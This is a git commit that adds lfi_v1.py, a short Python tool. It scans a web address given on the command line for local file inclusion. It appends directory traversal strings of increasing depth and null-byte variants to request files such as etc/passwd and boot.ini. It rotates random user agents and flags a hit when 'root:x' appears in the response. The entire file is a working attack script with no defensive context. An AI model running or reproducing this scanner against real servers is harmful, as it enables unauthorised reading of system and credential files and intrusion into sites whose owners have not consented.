d18beb5380dc1387202ae5faf44f421b49e36a7e
mehmet şerif paşa <mehmet81_gsss@hotmail.com>
2019-11-20 16:12:30 +0300

    Create lfi_v1.py

---
+++ lfi_v1.py
@@ -0,0 +1,40 @@
+import requests
+import sys
+import threading
+import random
+
+
+
+
+USER_AGENTS = [gent.strip() for gent in open("/Users/mehmetserifpasa/Desktop/python-denemeler/brsurdp/files/user-agents.txt")]
+url = sys.argv[1]
+
+class color:
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    BLUE = '\033[94m'
+
+def LFI(url):
+        one_step_deeper = ["../", "..2f"]
+        local_file = ["etc/passwd", "win.ini", "etc/passwd%00", "boot.ini%00", "boot.ini"]
+        for steper in one_step_deeper:
+            for file_path in local_file:
+                for depth in range(25):
+                    replace_string = (depth * steper) + file_path
+                    x = requests.get(url + replace_string,headers={"User-Agent":random.choice(USER_AGENTS)}).text
+                    print(url+replace_string)
+                    if "root:x" in x:
+                        print(color.RED+"*"*100)
+                        print(color.RED+"LFI BULUNDU ==>" + replace_string)
+                        print(color.RED+"*" * 100)
+                    else:
+                        pass
+LFI(sys.argv[1])
+
+
+
+
+
+
+
+
